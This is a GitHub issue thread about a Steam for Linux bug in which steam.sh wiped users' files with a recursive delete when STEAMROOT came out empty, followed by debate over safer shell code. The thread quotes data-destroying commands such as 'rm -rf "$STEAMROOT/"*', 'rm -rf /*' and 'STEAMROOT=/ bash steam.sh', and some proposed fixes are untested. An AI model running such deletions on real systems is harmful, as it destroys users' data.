rm -rf ~/.local/share/Steam
symlink ~/.local/share/Steam to the NTFS drive

When I did this on Ubuntu 14.04, all the steam scripts and binaries on the NTFS drive were stripped of the executable bit. So the function check_bootstrap() in /usr/bin/steam thinks there is no steam installed and gives you an error. Trying to rebootstrap or anything will fail due to the same lack of executable permissions on the NTFS drive. Still, nothing should be deleted at this point.

Now you might try to skip /usr/bin/steam and run ~/.local/share/Steam/steam.sh directly. Again, this will fail due to lack of executable bit on steam.sh. chmod +x ~/.local/share/Steam/steam.sh doesn't work either.

So now you're really annoyed and you open up a terminal, cd ~/.local/share/Steam and run ""bash steam.sh"". This is what triggers the horrible bug, because the  STEAMROOT=""$(cd ""${0%/*}"" && echo $PWD)"" incantation in steam.sh can't handle $0 being ""steam.sh"" instead of something like ""./steam.sh"". Launching the bootstrap fails, and we try to reset steam, but since STEAMROOT is wrong it ends up doing the rm -rf /

This is the only way I have found so far to trigger this bug. If you think there is some other sequence of events that happened on your machine, please let me know.

I plan to fix this by using STEAMROOT=""$(cd $(dirname $0) && echo $PWD)"" as well as adding extra checks for STEAMROOT being blank and the general improvements suggested by @rcxdude 
"
6389	"I only ran steam, but I launched from a shell with no options. I had
probably ten years of cruft in my .bashrc and .bash_profile because I would
add stuff and never delete it.  It is a pretty severe outcome, but I do not
know what caused it, which is why I was so calm in the report. I figured it
might be a combo of what I had done to my system combined with something I
had done long, long ago. I updated the bug to say I had customized all
kinds of stuff to hopefully keep people from continuing to make worthless
contributions.

If it makes a difference, I had /bin/sh linked to /usr/bin/bash instead of
dash, maybe some other symlinks too but I no longer have my bashrc and
bashprofile.

I do not know if that line everyone is pointing to gets called in the
process of launching steam, it may have been the culprit, but I can't even
set up my environment the exact way I had it to find out because I didn't
upload _everything_ to the cloud.

Thanks for looking into this. I really didn't expect it to get
sensationalized like this. You might try contacting some other people that
contributed and ask them if they ran the script as well or not to get a
better idea of what caused it.

If there is anything else I can tell you so people don't quake in their
boots to run steam, please let me know. Something failed, and it failed
spectacularly for me, but it might not even be reproducible without my
exact config and system, so all you can do is guess how it failed so
spectacularly.

Also, thanks for working on steam for linux!

On Fri, Jan 16, 2015 at 2:25 PM, johnv-valve notifications@github.com
wrote:

> @keyvin https://github.com/keyvin I have managed to reproduce this, can
> you tell me if this might describe what happened on your machine?
> 
> copy ~/.local/share/Steam to an NTFS drive.
> rm -rf ~/.local/share/Steam
> symlink ~/.local/share/Steam to the NTFS drive
> 
> When I did this on Ubuntu 14.04, all the steam scripts and binaries on the
> NTFS drive were stripped of the executable bit. So the function
> check_bootstrap() in /usr/bin/steam thinks there is no steam installed and
> gives you an error. Trying to rebootstrap or anything will fail due to the
> same lack of executable permissions on the NTFS drive. Still, nothing
> should be deleted at this point.
> 
> Now you might try to skip /usr/bin/steam and run
> ~/.local/share/Steam/steam.sh directly. Again, this will fail due to lack
> of executable bit on steam.sh. chmod +x ~/.local/share/Steam/steam.sh
> doesn't work either.
> 
> So now you're really annoyed and you open up a terminal, cd
> ~/.local/share/Steam and run ""bash steam.sh"". This is what triggers the
> horrible bug, because the STEAMROOT=""$(cd ""${0%/*}"" && echo $PWD)""
> incantation in steam.sh can't handle $0 being ""steam.sh"" instead of
> something like ""./steam.sh"". Launching the bootstrap fails, and we try to
> reset steam, but since STEAMROOT is wrong it ends up doing the rm -rf /
> 
> This is the only way I have found so far to trigger this bug. If you think
> there is some other sequence of events that happened on your machine,
> please let me know.
> 
> I plan to fix this by using STEAMROOT=""$(cd $(dirname $0) && echo $PWD)""
> as well as adding extra checks for STEAMROOT being blank and the general
> improvements suggested by @rcxdude https://github.com/rcxdude
> 
> —
> Reply to this email directly or view it on GitHub
> https://github.com/ValveSoftware/steam-for-linux/issues/3671#issuecomment-70307541
> .
"
6390	"@johnv-valve:

I just remembered a detail: I might have mounted the drive with an fmask set that would allow execution of all files. 
"
6391	"Just don't write these kinds of scripts in BASH / SH. Too bug ridden. Use python. Every distro now comes with Python because so many support scripts are written in it. Why not PERL? Because PERL has a strict mode as well, which means its default mode of operation can have braindead bugs like this one.
"
6392	"Too many ways to get quoting and if-tests wrong in Bash. 
"
6393	"I don't know of a language that prevents you from writing bad code. 

The code is not the entire problem. Lack of tests/testing seems to be an issue as well.
"
6394	"Most Times you call GNU rm, you should use ""rm <your options> -- <your path>"".

like:  rm -rf -- ${my_checked_path_var}

Thank you. 
"
6395	"> I don't know of a language that prevents you from writing bad code. 

This has to be the worst example for that. Bash ignores errors and undeclared variables. Ignored errors and undeclared variables are bad code, and most languages besides bash prevent one from using that type of bad code.

@robin-wittler You need to quote the variable, or else any spaces will cause it to be interpreted as several filenames. (The `--` does help it work with paths that begin with `-`.)
"
6396	"@robin-wittler : Directories may contain spaces.
my_checked_path_var=""/tmp/foo /home""
mkdir ""$my_checked_path_var""
ls -- ${my_checked_path_var}
"
6397	"@AgentME, @7eggert  ... yes you are absolutly right. I owe you all a beer. ;)

Should i mention IFS? ;)

Anyway, using quotes is always the less confusing way and it just works.
"
6398	"@7eggert Wrap code blocks with `````. Like this:

``````
```
foo
bar
```
``````

It will look like this:

```
foo
bar
```
"
6399	"johnv-valve wrote:

> > I plan to fix this by using STEAMROOT=""$(cd $(dirname $0) && echo $PWD)"" as well as adding extra >> checks for STEAMROOT being blank and the general improvements suggested by @rcxdude 

May I also suggest looking in the calculated $STEAMROOT, for presence of one or more items that can be expected to be present there, such as steam.sh, bin_steam.sh, and/or steamapps, before doing the remove?

If such items are not present, then you don't want to be nuking it, regardless of how carefully you computed the $STEAMROOT location.
"
6400	"This is pretty bad btw (from the current Steam beta):

```
if [ ""$STEAMROOT"" != """" ]; then
    rm -rf ""$STEAMROOT/""*
fi
```

You can just do `if [ ""$STEAMROOT"" ]; then`
Also `rm -rf ""$foo""/*` is too volatile to use in a script regardless or anything.
Use find:

```
if [ ""$STEAMROOT"" ]; then
    find ""$STEAMROOT"" -mindepth 1 -delete
fi
```

And the suggestion to use readlink (`STEAMROOT=$(readlink -nf ""${0%/*}"")`) is correct. Plz. The way it is done currently is abysmal.
"
6401	"I think it is actually more beneficial to check if it is a directory, so:
if [[ -d ""$STEAMROOT"" ]]...
(via FlutterRage from gamingonlinux)
"
6402	"It's a commentary on the sad state of shell scripting. It's hard to get right and few people really understand what they're doing; I sympathize with the developer who made this mistake.

I ran steam.sh through ShellCheck and, while it does not pick up on this issue, it does note a number of other bad practices. A tip for the amateurs: If you don't feel confident in your shell-fu. use validation tools to help. Or just ask someone who _is_ an expert.
"
6403	"@vdrandom you know / is a directory right?

[r3pek@trinity ~]$ [[ -d / ]] && echo ""is dir"" || echo ""not dir""
is dir
[r3pek@trinity ~]$ [[ -d /tmp/steam_chrome_shmem ]] && echo ""is dir"" || echo ""not dir""
not dir

-d doesn't solve anything
"
6404	"Ugh, this is really scary stuff.  Especially sad since it would never have happened if they had used Perl instead of Bash.    <hahahahahah> 
"
6405	"@r3pek yes, hence it's [[ -d ""${STEAMROOT}"" ]], not [[ -d ""${STEAMROOT}/"" ]]. The problem was with the lack of check whether it's empty. That test will also ensure that it is not only not empty, but is also a directory.

And that slash on the end of it was part of the hard code, not a variable.
"
6406	"@vdrandom yes, you're right ;) totally missed the difference :P
"
6407	"I can't reproduce this on Fedora, I don't get an selinux warning either. Anyone tried reproducing this in an VM?
"
6408	"For what it’s worth my ~/.local/share/Steam has been a symlink to another ext4 partition for 2 years, and apparently Steam hasn’t deleted any of my files.
But the OP is talking about ~/.local/share/steam; I don’t have a directory by that name (note the lower-case 's').
"
6409	"@victoredwardocallaghan

> Even build systems such as CMake, SCons, Cabal, etc..learnt shell script sucks in generality long ago!

Don't think that they protect you from doing dangerous stuff. See [here](https://github.com/hasufell/media-overlay/blob/master/media-gfx/blender/files/blender-2.68-fix-install-rules.patch). Blender upstream doesn't care until [this day](https://developer.blender.org/diffusion/B/browse/master/source/creator/CMakeLists.txt;119ff676e1b348a66e33cd857089e78a5195a3c5$291).
"
6410	"Checking that ""${STEAMROOT}"" is a non-empty shell variable, that resolves to a directory, is **not** enough, in my view.

If STEAMROOT=/, then that's a non-empty setting resolving to a directory.  But I don't want to remove all files in any directory below /, limited only by which directories I have write permission in <grin>.

If a script that most users will run blindly (without having carefully read and understood it, or even being competent to do so) is going to remove an entire directory sub-tree, then there should be a marker file in that sub-tree, that marks it as ""one of those sub-trees which can be so deleted.""

Such a check would, amongst other things, help guard against a confused or malicious setting of STEAMROOT in the environment in which steam.sh is invoked, as in ""STEAMROOT=/ bash steam.sh""

I recommend that steam scripts take these steps for all usage of such a variable as STEAMROOT:
1) Get STEAMROOT set
2) Verify that it really looks like a steam root directory (has a clearly named file, whose name and contents so state)
3) Then do whatever you will with that STEAMROOT (fix, update, clean up, or remove ... whatever)

That file might have some such name as ""STEAMROOT_marker_file.README.txt"", and might have a short paragraph of text stating that ""All files in and below the directory containing this STEAMROOT_marker_file.README.txt file are controlled by your Steam installation, update and configuration scripts.  Such files may be removed or modified without notice.  Don't place anything else in this directory or below.""
"
6411	"BTW: I frequently symlink start scripts into ~/bin.
"
6412	"readlink will still resolve the path to the real steam.sh path.
And you don't need to link steam.sh into ~/bin anyway, steam is supposed to be run by the bootstrap binary.
"
6413	"Is there any comment from valve about this ""bug""?
"
6414	"This is still strange, the command ""rm -rf /"" cannot work from the steam script because it needs super user privileges and also the additional argument ""no-preserve-root"".
"
6415	"@karbrueggen, the fix has been already pushed into the beta, what other comment do you expect?
"
6416	"@fcole90 ""rm -rf /*"" (note the asterisk), however, does not need super user privileges, nor is it hindered by --preserve-root.

And while it can't delete the operating system files without super user privileges, it is perfectly capable of erasing all personal user data on the system. Which is exactly what @keyvin reported.
"
6417	"> the fix has been already pushed into the beta, what other comment do you expect?

Uhm. How they are going to try to prevent this kind of mistake from happening again. QA, peer-review, tests, whatever?
"
6418	"Ideally they would drop shell scripts. Python has everything to do this
stuff safely and it is standard to the python interpreter you ship with the
software. Yes, they can include an entire python interpreter in their steam
application. You really can't make assumptions on Linux about anything when
it comes to cross distribution shell scripts.

It would have been OK if it had just crashed, without even logging. That is
failing gracefully. What it did was fail spectacularly. I think the
developers should consider using a better scripting language, unless the
bash stuff was just a prototype that survived into Beta.

Thanks for bringing us steam for Linux!
On Jan 18, 2015 1:44 PM, ""Julian Ospald"" notifications@github.com wrote:

> the fix has been already pushed into the beta, what other comment do you
> expect?
> 
> Uhm. How they are going to try to prevent this kind of mistake from
> happening again. QA, peer-review, tests, whatever?
> 
> —
> Reply to this email directly or view it on GitHub
> https://github.com/ValveSoftware/steam-for-linux/issues/3671#issuecomment-70419895
> .
"
6419	"> I think the developers should consider using a better scripting language, unless the bash stuff was just a prototype that survived into Beta.

You can do that kind of mistake in pretty much any programming language (some just make it harder, especially typesafe ones). In python you can also open subprocesses with a true shell context and mess up whatever you like. And people do that.

The reason most (source) distributions have a sandbox and a lot of abstraction in their package manager is because they don't trust any scripts/build-systems. Through the package manager it is usually not possible to remove files that do not belong to the package, because the files that belong to the package are recorded in a database.

So, without any such concept and abstraction model that only does predictable things instead of a quickly hacked up shell/python/whatever script... this can happen again, regardless of language or build system.
"
6420	"a change of language just gets you a change of bugs. this should be coded more responsibly and adhere to POSIX standards. we also need a real, hardened POSIX shell that is not just bash playing shadow puppets.
"
6421	"> The reason most (source) distributions have a sandbox and a lot of
> abstraction in their package manager is because they don't trust any
> scripts/build-systems. Through the package manager it is usually not
> possible to remove files that do not belong to the package, because
> the files that belong to the package are recorded in a database.

Oh yeah, things like deb packages don't rely upon scripts and people
haven't had any trouble about them. Yes. And I didn't receive a gift
license key from a package maintainer for helping as a remote 3rd-party
to resolve such an issue happened to random user on IRC recently. Yeah.
Not possible to remove files or do crappy #Scary things with
system-wide privileges.
"
6422	"Does this affect Fedora, because I can't find a `steam.sh` on my system.  I have a steam package from rpmfusion.

```
$ rpm -q steam
steam-1.0.0.47-2.fc20.i686
```

my `/usr/bin/steam` does not have any reference to `reset` or `STEAMROOT` or a wildcard ""rm -rf"" (it does have some `rm -f`s of specific files as well as an `rm -fr $LAUNCHSTEAMPLATFORM/steam-runtime` which seems a bit safer) . it contains the following line:

```
export STEAMSCRIPT_VERSION=100047
```
"
6423	"@ahamid I do have it under (slightly outdated) Fedora 20.

```
$ uname -r
3.17.8-200.fc20.x86_64
$  rpm -q steam
steam-1.0.0.49-3.fc20.i686
$ cat .local/share/Steam/steam.sh | grep Scary!
    # Scary!
```

My steam script seems to be a bit newer than yours:

```
$ cat /usr/bin/steam | grep STEAMSCRIPT_VERSION=
export STEAMSCRIPT_VERSION=100049
```

About Steam:

![bildschirmfoto von 2015-01-19 03 35 13](https://cloud.githubusercontent.com/assets/11575/5795268/3fe8fec6-9f8c-11e4-86cd-7a90701e9dd3.png)

I believe I have Steam from RPM fusion as well.
"
6424	"fcole90 commented 12 hours ago

> > This is still strange, the command ""rm -rf /"" cannot work from the steam
> > script because it needs super user privileges and also the additional
> > argument ""no-preserve-root"".

I beg to differ.  That ""rm -rf"" command is recursive, silently forced, from the root '/' down.

Sure, whatever is directly in the root '/' directory is probably safe, because very few user systems are so badly configured that the root directory is user owned or user writeable (and those users have already decided to practice sky diving without a parachute.)

However, ""rm -fr /""  will traverse **all** mounted file systems, silently removing **every** file (no matter the file's permissions or ownership) in **every** directory, for **any** directory that allows user write permissions, and is below a directory path that is searchable (higher level directories are executable.)

Very few users have a backup strategy in place that will recover from that sort of damage without great pain and loss.
"
6425	"@Bengt Ow! You're right, I thought I checked everywhere for `steam.sh` but it _is_ there under `.local/share/Steam`.  Is there an interim safeguard - I feel like commenting this line out entirely.  Actually the whole script is littered with `rm -rf` commands.
"
6426	"@ahamid See: https://github.com/ValveSoftware/steam-for-linux/issues/3671#issuecomment-70298406 ... In contrast, just left everything as it is for now, because it seems to me that fiddling around with Steam's files might cause more trouble. I am aware of the Steam's current volatile nature, make backups of my most valuable stuff and wait for an official fix.
"
6427	"It's better to rewrite the script in another language. Python should be a good language for this. It's not good to have unmaintable scripts like this. No one would read the code and no one want to do changes on the code, because it works anyway.
"
6428	"@sosi-deadeye, and that would help exactly how? It is entirely possible to write bad and unreadable code in virtually every language out there.
"
6429	"@Valve: I know this stuff is opensource, but you don't have to copy all of my code :)
"
6430	"An even better fix, btw, would be to hardcode such things.
Guessing the script's location reliably is basically impossible for every case; it's a bad practice overall.
"
6431	"That would help to do it in the right way. Writing good readable shell
scripts is nearly impossible. Did you ever looked inside init-scripts? They
are doing lot of magic with including sources into the init scripts. But
the code ist unmaintainable. For example the srds_run is horrible to read.
I do understand the code, but never want to change anything there.

Jack Frost notifications@github.com schrieb am Mo., 19. Jan. 2015 12:25:

> An even better fix, btw, would be to hardcode such things.
> Guessing the script's location reliably is basically impossible for every
> case; it's a bad practice overall.
> 
> —
> Reply to this email directly or view it on GitHub
> https://github.com/ValveSoftware/steam-for-linux/issues/3671#issuecomment-70479202
> .
"
6432	"Init scripts used to be small and maintainable. But if you add crude logic to also configure the application by collecting various information from around the system, you'll get a program containing tons of crude logic in any language.

Besides, system($PROG_RM."" -rf "".$STEAMROOT.""/*"") would not be better.
"
6433	"I don't get why '/*' is even needed. How better is it compared to { rm -R ""$STEAMROOT""; mkdir ""$STEAMROOT""; }? Using wildcards for removal, especially recursive, is a very, very dangerous thing to do to begin with, not to mention that -f is also barely ever needed.
"
6434	"Redundant, but:

```
if [ ""$STEAMROOT"" != """" ] && [ ""$STEAMROOT"" != ""/"" ]; then
  rm -rf --preserve-root ""$STEAMROOT/""*
fi
```

You could also add checks for typical linux directories:

/{usr,var,bin,sbin,etc}

You get the point here. Might not be a bad idea to force `STEAMROOT` to be inside of `~/` as well.

EDIT: Probably good to have both checks as not everyone is necessarily using GNU `rm`.
"
6435	"> Oh yeah, things like deb packages don't rely upon scripts and people haven't had any trouble about them.

I don't think debian is a good example for QA.

The point was to move away from uninstall/cleanup methods that have undefined behavior and rather look up files from an internal database and **_remove known files only**_. That is a completely different concept.

This is just an example for: underestimated the problem to be solved. And Linux distros have decades of experience with this problem. Just use it. It's open source.
"
6436	"> > Oh yeah, things like deb packages don't rely upon scripts and
> > people haven't had any trouble about them.
> 
> I don't think debian is a good example for QA.
> I just reminded you of the other side without which the system you
> mentioned doesn't work. Likely, RPM too, as far as I can recall.
> 
> The point was to move away from uninstall/cleanup methods that have
> undefined behavior and rather look up files from an internal database
> and **_remove known files only**_. That is a completely different
> concept.
> Yes, I'd like this idea. If I don't remember trashed Win Registry and
> all those Program Files folders with useless abandoned things the
> initial installer database doesn't contain. This is not a panaceia,
> sigh.
"
6437	"> I just reminded you of the other side without which the system you mentioned doesn't work. Likely, RPM too, as far as I can recall.

You really miss the point. This is not about being bug-free, but about making fundamental mistakes less likely by introducing concepts that are more strict and allow less random effects (and that doesn't just involve a different language). That is pretty basic and I shouldn't have to explain it.

Repeating the whole history and all experiences of existent, widely tested solutions is valid, but not really smart. That's why we are here.

The current ""fix"" for this bug is still wrong.

> Yes, I'd like this idea. If I don't remember trashed Win Registry and all those Program Files folders with useless abandoned things the initial installer database doesn't contain. This is not a panaceia, sigh.

You are just reminding us that windows is broken and mix it up with other arguments. That's not really a coherent argumentation.
"
6438	"> The current ""fix"" for this bug is still wrong.
> Here's where I agree.
"
6439	"All bug fixes from Steam/Valve will be wrong unless they do a _cultural_ change in how they write their software.
- Talking about NTFS drives is something no one should even think about on Linux (the FS should never matter)
- Not having case-sensitive drive support on MacOS X is even worse
- And then here's this shit - `rm -rf /*`
- Then again, how about Retina support? (and I'm not speaking of OS X only, I run a linux rig with a 4K display at work)
- Please add anything you know of, I just got tired
"
6440	"@rpdelaney I don't agree with that. I think that using set -e and set -u is actually a very good coding practice. And the best example if this bug.

When one of the commands that your script runs returns an unexpected error, IMHO is always better to have the script aborting than to continue and risk causing some very undesirable situation (like wiping all your files).

For example, the Debian Policy Manual states that all maintaner scripts should either check every command for the return value or run with ""set -e"" defined (those are the scripts that are executed when a package is installed or removed: postinst/postrm/etc..):

```
Every script should use set -e or check the exit status of every command. 
```

https://www.debian.org/doc/debian-policy/ch-files.html#s-scripts
"
6441	"@ryanpcmcquen Don't compare paths with =, use -ef:

```
if [ $EUID -eq 0 ]; then
    echo ""This script should not be run as root!"" 1>&2
    exit 1
fi

STEAMSH=$(readlink -e -- ""$0"")
STEAMROOT=$(dirname -- ""$STEAMSH"")

if [ ! -d ""$STEAMROOT"" -o ""$STEAMROOT"" -ef / -o ""$STEAMROOT"" -ef /home -o ""$STEAMROOT"" -ef ""$HOME"" ]; then
    echo ""Illegal STEAMROOT: $STEAMROOT"" 1>&2
    exit 1
fi
```

_Warning:_ This code is untested.
"
6442	"@panzi :+1: 

What does -ef do?
"
6443	"@ryanpcmcquen 

http://tldp.org/LDP/Bash-Beginners-Guide/html/sect_07_01.html

`[ FILE1 -ef FILE2 ]`
**True** if _FILE1_ and _FILE2_ refer to the same device and inode numbers.
"
6444	"I dont usually get critical in bug reports but seriously?????  Just checking for null then deleting everything??

# Check before removing
if [ ""$STEAMROOT"" != """" ]; then
rm -rf ""$STEAMROOT/""*
fi

what if $STEAMROOT is a space char, "".."" or a whole bunch of other possibilities.  This still an untested amateur hour waiting to happen.  There should be a list/db of items to delete and those should be the only possible items to ever delete with this script.
"
6445	"@cebericus $STEAMROOT is not going to have just any arbitrary value in it. An error in it being set leads to it being an empty string.
"
6446	"Sorry, but it does not matter.  You cannot predict all future usages or changes to the script and depending on a discontinuous section of the code to insure that rm -fr behaves correctly is bad design and bad practice.  Better safe than sorry.
"
6447	"@gdrewb-valve do you already have a plan for fixing that problematic maintenance script?

I am scared about further executing steam.sh after reading it as i saw many pitfalls in the code which can lead to undefined behaviour (or chaos).

I agree with @cebericus. Steam needs an installer/deinstaller application supported by a database where every installed file is registered, that would be a proper fix. ""rm -r"" is not an uninstallation routine.
"
6448	"Don't make a DB, please.

To anyone who suggests it: If you wanna be ""this much safe"" go back to Windoze. You have your db, and just gotta format every 6 months.

We just need better checks for `rm -rf`

@keyvin, amazing bug report by the way. A lot of people here could learned a few things from you. Hope you get to try something new after wiping your configuration, 10 year's is a long time and I surely would take the chance to try out a lot of new stuff.

On the matters of blaming: Don't ""blame"" developers for bugs, this will bite you in the ass sooner or later. EVERYBODY makes mistakes, at least a few of them. If you make only ONE and it wipes an entire system, you're still fucking amazing, and one person is allowed to hate you.

About changing the language: I completely disagree. I think we need better checks for where the executable is and where steam files are. I also think this shouldn't be a script in any language, this should be coded ""properly"", in whatever language, and not rely on anything, rather detecting all folders and files through brilliant coding. :D

If that's impossible, then the language doesn't matter, what matters is fixing every little bug and improving the errors. Introducing a bazillion python bugs to the ""new script"" is definitely the last thing we need.

Lastly, thanks to Valve for trying to make steam work in our insane Linux World (How many distros supported already? Runs flawlessly on Arch Linux, Manjaro, Bridge, Debian and Ubuntu, by the way) and all my loving to the developers who have to read stupid people talking as if their code in a GitHub comment would have fewer bugs than Valve's ""because they are smarter that the entirety of Valve developers"".
"
6449	"The only ""database"" needed is hardcoding ~/.local/share/Valve_Steam/ into the application, and maybe testing for /opt/Valve_Steam/. Linux does support symlinks, therefore hardcoding is no problem.

```
STEAMROOT=~/.local/share/Valve_Steam/
if [ \! -d ""$STEAMROOT"" ]; then
if [ -d /opt/Valve_Steam/ ]
then STEAMROOT=/opt/Valve_Steam/
else 
mkdir -p ""$STEAMROOT""
if [ \! -d ""$STEAMROOT"" ]
then echo ""cannot create $STEAMROOT""; exit 1
fi
fi
fi #untested
```

This may still go wrong, but it's by shooting your own foot, not by a script having unexpected behavior.

BTW: I suspect ~/.local/share is the wrong location, since ""share"" means ""these data are the same across different CPU architectures, no need to have a different one on arm or sparc""
https://en.wikipedia.org/wiki/Filesystem_Hierarchy_Standard
"
6450	"@7eggert, it's XDG directory structure, see http://standards.freedesktop.org/basedir-spec/basedir-spec-latest.html. $XDG_DATA_HOME is used because there is no standard for storing arch-dependant binaries, libs and so on within $HOME.
"
6451	"Then XDG is to blame for being incomplete and bad.
"
6452	"@7eggert according to the Wikipedia citation you linked, `/share` is ""Architecture-independent (shared) data."" I can find no reference to `~/.local/share`, nor to a standard meaning for `share` generally.

There is some basis for a precedent though, under `/local`: ""Tertiary hierarchy for local data, specific to this host. Typically has further subdirectories, e.g., `bin/`, `lib/`, `share/`.""

Along those lines, it would seem perfectly logical that if `/local` is ""Tertiary hierarchy for local data specific to this host"", then `~/.local/` would be ""Tertiary hierarchy for local data specific to this user."" And thus `~/.local/share` is ""Tertiary hierarchy for local data specific to this user that is architecture independent.""

It's not clear how the XDG standard is ""to blame for being incomplete and bad."" It looks more like the XDG standard did not agree with your preconceptions about what `share` should mean when abstracted from any meaningful context.
"
6453	"You're describing my way of thinking. ""share"" == ""shared data across systems"".

My view about XDG is ""It should work as intended even if I have $HOME mounted on my Mac and my PC, and you know why your 'solution' is intentionally and unnecessarily wrong.""
"
6454	"I'm not persuaded, but on second look this seems really off topic for this bug report. Sorry for continuing the derail.
"
6455	"@frnco Just as a side note: Using a DB is the Linux way. See all package managers. Some of them even transactionally install/remove packages. Also a typical Linux distribution has a release cycle of 6 months, meaning you have to reinstall your Linux system every 6 months (unless you think dist upgrade is not too risky for you). Sorry for being off topic.
"
6456	"@frnco

> To anyone who suggests it: If you wanna be ""this much safe"" go back to Windoze. You have your db, and just gotta format every 6 months.

You probably don't know, but literally any linux distro package manager uses a DB.
"
6457	"It seems what we want to do is confirm that the folder steam.sh wants to delete on a reset is the folder steam made in the first place, isn't this easy when you use an empty file as a marker? In pseudo-code, it would be: if test ( ""$STEAMROOT/.steam.keep"" file exists ) then delete folder contents, else tell user that this sanity check has failed and manual intervention is required (explicitly die here), end if. You add this .steam.keep file by either using the touch command or adding it to generic steam user download. Most users should not care you added a handful of filesystem bytes to prevent the bad scenario.

This should exclude all not target folders unless the user is willfully killing their own system.
"
6458	"@Tele42 this doesn't really tell you if you just wiped a lot of user files as well, but it's certainly better than just checking a variable for null
"
6459	"@hasufell The upside is that it would seconds to minutes of dev time to implement.
"
6460	"@panzi I user Arch, so it's rolling release, I never reinstall. And I think no worries about off-topic on this case, it's pertinent. And you do have a good point, as @hasufell . I shouldn't be judgemental, using a DB is not a bad thing necessarily.

Still, I don't think it is a great way, especially in this case. I can see things easily going awry with a DB, especially considering Steam is, in a way, a Package Manager, and one with a bazillion games that each can do a lot of stuff on the system.

Steam would have to keep track of every file it had ever downloaded/created/edited/etc, and, considering the amount of games on Steam, I think that would take too long to code, raise complexity too much (And needlessly), take a LOT of disk space and a lot of time to run, plus it would increase the risk of bugs.

I think the best idea so far is testing the folder, checking if it is a valid path, if it's not a system directory, if it exists and if it has some specific files in it, and then deleting the tree. Adding a README.txt telling people not to copy files over there can also be great, but even Steam on Windows erases, for example, game mods if you tell it to check for corrupted files, so I don't think that's so bad. At least we're making sure Steam only ""messes"" its own directories.

Perhaps Steam should use some of the solutions from package managers. Perhaps that is the best way. I just think we need something more feasible for an immeadiate solution. And developing a system for tracking files plus a DB for those files because of one `rm -rf` deep in a bash script that went awry one time seems a bit overkill to me. Much more feasible to check before the `rm -rf`
"
6461	"Yes, it cannot keep track of all the game files, because the games might create/change their files in an unknown manner to steam. But it could keep track of it's own files and of the game directories. Just recursively wipe the game directories without following symlinks, but exactly delete only known steam files. Anyway, I think better checks (like I wrote above) would be good enough.
"
6462	"@panzi I think ""good enough"" and ""quickly"" are the things we should be looking for in an answer to this bug. :D
"
6463	"> Steam would have to keep track of every file it had ever downloaded/created/edited/etc, and, considering the amount of games on Steam, I think that would take too long to code, raise complexity too much (And needlessly), take a LOT of disk space and a lot of time to run, plus it would increase the risk of bugs.

First, there are already existent solutions for this and e.g. ChromeOS realized it can just use them. There is no reason to code something like this from scratch.

Second, I don't know what you mean with complexity exactly. Algorithmic complexity, LOC?

The argument of disk space is simply wrong. A DB can also be a simple text file and most package managers use plain text files.
You can test it yourself:

```
cd /steam/root/folder # make sure it worked, lol
find . -type f -exec echo '{}' >> mysteamdb.txt \;
du -sh mysteamdb.txt
```

The argument of runtime is just weird. I'd rather have it take 20 seconds more and be much more safe.

The argument of risk of bugs is even weirder. Shell scripts that are based on live filesystem checks and random variables are so full of side effects and undefined behavior (if you have dealt with autotools, then you know that shell definitely does have undefined behavior) that an abstraction layer is a very good solution to this problem. Sometimes a proper solutions takes more LOC. That's a fact.
"
6464	"@hasufell If you want to be really exact use:

```
find . -type f -print0 >> mysteamdb.db
```

This will separate file names using nil bytes, because a newline is a valid character in file names under Linux. You can then do things like this:

```
xargs -0 < ~/mysteamdb.db ls -lh
```
"
6465	"@hasufell I was thinking about code complexity. More code, more functionality.

Your other points are indeed valid. 20 seconds is not horribly bad, and that's an engineering choice. I just think we should focus on the best bugfix, and allow engineers to develop the best solution they think they can, because we're not gonna design the ideal solution in here.
"
6466	"""undefined behavior"" == ""Don't do that then"", not ""find out what this version of that shell does in that corner case and use it""
"
6467	"@frnco it wouldn't need to worry about game files. We're talking about the Steam client only. It would only have to keep track of the Steam client files.
"
6468	"We shipped a one-line fix to avoid the one situation where we could reproduce the problem. We are still working on some more comprehensive changes, but we wanted to get a fix out there quickly in case this somehow hit anybody else.

If anybody knows how to actually reproduce this bug, please post the steps here or email me directly. So far we have not been able toe reproduce it and I would hate to be barking up the wrong tree if the problem is really somewhere else.

Also, I'd appreciate it if people would not use this bug report as a general discussion and debate forum. I don't want to lock the thread, but it is pretty hard to separate out the noise at this point. Thanks!
"
6469	"  Am I only one who tries to understand why the hell Steam needs to wipe
a directory on my machine? Even if it was Steam who brought it here,
why should it ever wipe it? Can't it do something not dumb instead?
"
6470	"@Plaque-fcc Like leaving unused files forever keeping your bits flipped in unnecessary ways? Whatever. We're not here to discuss engineering decisions, we're here to comment on a BUG (By definition, something that didn't work as intended).

@johnv-valve I believe this one-liner deeply interests many people, plus we're all worried about unpredicted and/or unpredictable edge-cases. I'm not inclined to believe any one-liner can avoid all edge cases, so it would be great if said ""one line"" was provided for scrutiny, and if more checks for the variables used with `rm` and folders to be erased were put in place.

I also disagree with you (And I hope you get what I mean) in that it's not a matter of ""can reproduce"", it's a matter of ""can happen"", especially if later someone changes the script in any unpredictable way. Redundancy can feel horrible, but `rm -rf` is one of those cases I'm pretty sure it's FAR better to be safe than sorry, especially if you files are on the line.
"
6471	"@frnco 

> ...it's not a matter of ""can reproduce"", it's a matter of ""can happen""...

Establishing ""can reproduce"" is critical to preventing ""can happen"" since if you can't reproduce the error then you can't know if you've fixed it or not.
"
6472	"@frnco the referenced one-liner is in the current steam linux beta client:

```
        # Check before removing
        if [ ""$STEAMROOT"" != """" ]; then
                rm -rf ""$STEAMROOT/""*
        fi
```
"
6473	"@rpdelaney That's why I said ""I hope you get what I mean"".

Maybe it's even impossible to reproduce this issue on that file, especially after the one-liner, but if you look at just a block of code, it's easy to reproduce the ""erasing of everything"". We need at LEAST `rm` so let's test every line that includes `rm`.

```
rm -rf ""$STEAMROOT/""*
```

This for instance is easy to debug and test. If you wanna, try writing unit tests for it (But please be careful of where you run it. :D).

Bugs that depend on state are easy to reproduce if you isolate the code and ""guess"" possible states. That's how we unit-test stuff isn't it? That's the kind of bugs that happen ""only in production"" or ""only on your client's 6-year-old-pc with this and that specific software installed"". Do you go to your clients to code on their computers whenever you find a bug...? Or do you just tell them  you can't reproduce...?

Bash scripting, monolithic and confusing code... Complaining about needing to reproduce something under those coditions is not an argument, it is, at best, an excuse. The solution is easy: isolate the code, make it work properly whatever the ""other lines"" throw at it.

